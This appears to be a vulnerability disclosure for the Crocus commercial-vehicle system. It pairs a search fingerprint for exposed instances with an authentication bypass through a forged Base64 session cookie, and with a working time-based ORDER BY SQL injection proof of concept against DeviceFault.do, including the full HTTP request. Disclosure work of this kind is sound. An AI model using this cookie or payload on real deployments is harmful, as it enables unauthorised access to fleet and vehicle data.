# SQL Injection Vulnerability in the DeviceFault.do Interface of Crocus System by Shenzhen Ruiming Technology Co., Ltd.

## Basic Information

### System Overview
As a provider of intelligent IoT (AIoT) solutions for commercial vehicles focusing on AI and video technologies, Shenzhen Ruiming Technology Co., Ltd. has the Crocus System as one of its core products. The Crocus System is designed to leverage artificial intelligence (AI), high-definition (HD) video, big data, and autonomous driving technologies to help commercial vehicles reduce traffic accidents and cargo loss, while improving the operational efficiency of enterprises or fleets.
<img width="2234" height="1040" alt="image" src="https://github.com/user-attachments/assets/91d5964d-7b13-41b0-8e93-3f6fd9be0aae" />

### System Fingerprint
`body="/ThirdResource/respond/respond.min.js" && title="Crocus"`

<img width="1595" height="1150" alt="image" src="https://github.com/user-attachments/assets/a0fe1cda-b99c-46af-a4ba-51f551c30cc8" />

## Vulnerability Exploitation

### Privilege Bypass

<img width="1911" height="1091" alt="image" src="https://github.com/user-attachments/assets/388ced0b-2c69-45c7-8502-2c752773dec8" />

We found the location where the Cookie is generated in `streamax.saffron.controller.registerlogin.RegisterLoginController#SetUserCookie`.
It can be seen that all its parameters are controllable by the user. The code is as follows:

```java
    private void SetUserCookie(int userID, String userName, String password, int roleID, String guid, String map, String ins, HttpServletResponse response) throws Exception {
        String cookieStr = "UID=%s&UN=%s&GID=%s&RID=%s&M=%s&INS=%s";
        if (!CommonFunction.validate(new String[]{map})) {
            map = "";
        }

        if (!CommonFunction.validate(new String[]{ins})) {
            ins = "0";
        }

        cookieStr = String.format(cookieStr, userID, userName, guid, roleID, map, ins);
        String base64 = (new BASE64Encoder()).encode(cookieStr.getBytes("utf-8"));
        base64 = base64.replaceAll("\r|\n", "");
        Cookie cookie = new Cookie("Saffron.U", base64);
        cookie.setMaxAge(-1);
        cookie.setPath("/");
        response.addCookie(cookie);
    }
```
Based on this, we can forge a Cookie:

```
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
```
<img width="525" height="475" alt="image" src="https://github.com/user-attachments/assets/e6a4be9c-d171-4426-8af6-66be581cb523" />

At this point, we have bypassed the authentication of this system.

### SQL Injection Vulnerability
<img width="2210" height="1395" alt="image" src="https://github.com/user-attachments/assets/ccd2a835-11af-4fee-80a8-952b3193a7bb" />

```xml
<mapper namespace="streamax.saffron.mapper.inters.operationstate.IDeviceInfoMapper">
	<select id="queryFromLast" parameterType="HashMap" resultType="DeviceInfo">
		select a.vehicleid,a.chipcode,a.platecolor,a.deviceno,a.devicetype,a.identification,d.*,b.groupname,c.simno
		from vehicledeviceinfo as a join last_deviceinfo as d on a.chipcode = d.chipcode  join 
		 groupinfo as b on a.groupid = b.groupid left join simcardinfo c on d.imsi=c.imsi
		<where>
			<if test="vehicleIdList.size()>0">
				a.vehicleId in 
				<foreach collection="vehicleIdList" item="vehicleId" separator="," open="(" close=")">
					#{vehicleId}
				</foreach>
			</if>
			<if test="field==null and value!=null">
  				and (a.chipcode like concat('%',#{value},'%') or a.carlicense like concat('%',#{value},'%') 
  				or a.deviceno like concat('%',#{value},'%') or a.identification like concat('%',#{value},'%')
  				or c.simno like concat('%',#{value},'%')
  				or a.devicetype like concat('%',#{value},'%') or d.ipcversion like concat('%',#{value},'%')
  				or d.cp4version like concat('%',#{value},'%') or d.gdsversion like concat('%',#{value},'%'))
  			</if>
  			<if test="field!=null and value!=null">
  				and ${field} like concat('%',#{value},'%')
  			</if>
		</where>
		<if test="sortField!=null">
			 order by ${sortField}
			 <if test="sortType=='desc'">
			 	desc 
			 </if> 
		</if>
		<if test="startIndex>=0">
			<if test="endIndex>=0">
				limit #{startIndex},#{endIndex}
			</if>
		</if>
	</select>
```
An **ORDER BY injection** vulnerability exists here.

The source point is identified as follows:
```java
@RequestMapping(params = {"Action=Query"})
    @ResponseBody
    public Object Query(HttpServletRequest request, HttpServletResponse response) {
        int code = 200;
        int count = 0;
        List<DeviceFaultInfo> result = new ArrayList<>();
        try {
            String vehicleId = request.getParameter("VehicleId");
            String groupId = request.getParameter("GroupId");
            String field = request.getParameter("Field");
            String value = request.getParameter("Value");
            new ArrayList();
            List<Integer> vehicleIdList = new ArrayList<>();
            if (CommonFunction.validate(groupId) && CommonFunction.stringToIntegerList(groupId).contains(1)) {
                vehicleIdList = new ArrayList<>();
            } else {
                if (CommonFunction.validate(groupId)) {
                    List<Integer> groupIdList = this.service.getAllChildrenGroupId(CommonFunction.stringToIntegerList(groupId));
                    vehicleIdList.addAll(this.service.getAllVehicleId(groupIdList));
                }
                if (CommonFunction.validate(vehicleId)) {
                    vehicleIdList.addAll(CommonFunction.stringToIntegerList(vehicleId));
                }
                if (!CommonFunction.validate(groupId) && !CommonFunction.validate(vehicleId)) {
                    String uID = CommonFunction.getCookieInfo(request, "UID");
                    List<Integer> groupIdList2 = this.service.getUserAllGroupId(Integer.parseInt(uID));
                    vehicleIdList.addAll(this.service.getAllVehicleId(groupIdList2));
                }
                if (vehicleIdList == null || vehicleIdList.size() < 1) {
                    return CommonFunction.createResultMap(200, 0, new ArrayList());
                }
            }
            String faultType = request.getParameter("FaultType");
            String startTime = request.getParameter("StartTime");
            String endTime = request.getParameter("EndTime");
            String repairState = request.getParameter("RepairState");
            String userName = request.getParameter("UserName");
            String sortField = request.getParameter("orderField");
            String sortType = request.getParameter("orderType");
            int page = new Integer(request.getParameter("PageIndex")).intValue();
            int rows = new Integer(request.getParameter("PageSize")).intValue();
            List<Integer> faultTypeList = new ArrayList<>();
            if (faultType != null && faultType.length() > 0) {
                for (String str : faultType.split(",")) {
                    faultTypeList.add(Integer.valueOf(Integer.parseInt(str)));
                }
            }
            List<String> userNameList = new ArrayList<>();
            if (userName != null && !userName.isEmpty()) {
                for (String str2 : userName.split(",")) {
                    userNameList.add(str2);
                }
            }
            if (startTime != null && startTime.length() > 0 && endTime != null && endTime.length() > 0) {
                Date start = this.sdf.parse(startTime);
                Date end = this.sdf.parse(endTime);
                result = this.service.query(vehicleIdList, start, end, faultTypeList, field, value, repairState, userNameList, sortField, sortType, page, rows);
                count = this.service.queryCount(vehicleIdList, start, end, faultTypeList, field, value, repairState, userNameList);
            } else {
                result = this.service.queryLatest(vehicleIdList, faultTypeList, field, value, repairState, userNameList, sortField, sortType, page, rows);
                count = this.service.queryLatestCount(vehicleIdList, faultTypeList, field, value, repairState, userNameList);
            }
        } catch (Exception e) {
            code = 202;
            CommonFunction.writeExceptionLog("DeviceFault", e);
        }
        return CommonFunction.createResultMap(code, count, result);
    }
```
Similar to the previous SQL injection cases, the `sortField` parameter here is still controllable by the user.

Based on this, we constructed the following Proof of Concept (POC):

```
POST http://ip:port/DeviceFault.do?Action=Query HTTP/1.1
Host: ip:port
Content-Length: 163
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
Content-Type: application/x-www-form-urlencoded

EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep(4))a)&orderType=asc
```
<img width="1934" height="885" alt="image" src="https://github.com/user-attachments/assets/182467be-5357-441a-befe-6539a47b896e" />


The successful 4-second delay confirms that the `DeviceFault.do?Action=Query` interface has an SQL injection vulnerability.

Thank you for your review! Wish you a happy day every day!
